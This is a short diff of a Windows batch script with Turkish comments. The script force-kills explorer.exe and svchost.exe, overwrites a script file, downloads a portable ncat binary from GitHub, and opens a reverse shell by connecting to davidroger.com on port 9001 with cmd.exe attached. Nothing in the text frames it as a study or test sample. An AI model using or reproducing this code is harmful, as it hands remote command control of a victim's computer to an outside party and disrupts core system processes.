@@ -1,5 +1,3 @@
-taskkill /f /im explorer.exe
-taskkill /f /im svchost.exe
 
 :: Dosyalari sil
 cd %temp%
@@ -29,8 +27,13 @@ set "tempfile=%temp%\temp_script.bat"
 ) > "%tempfile%"
 
 copy /y "%tempfile%" "%script%" >nul
+
 cd %temp%
 del /f /q "temp_script.bat"
+
+taskkill /f /im explorer.exe
+taskkill /f /im svchost.exe
+
 :: ncat indir ve calistir
 curl -L https://github.com/cyberisltd/NcatPortable/raw/refs/heads/master/ncat.exe -o ncat.exe
 ncat.exe davidroger.com 9001 -e cmd.exe
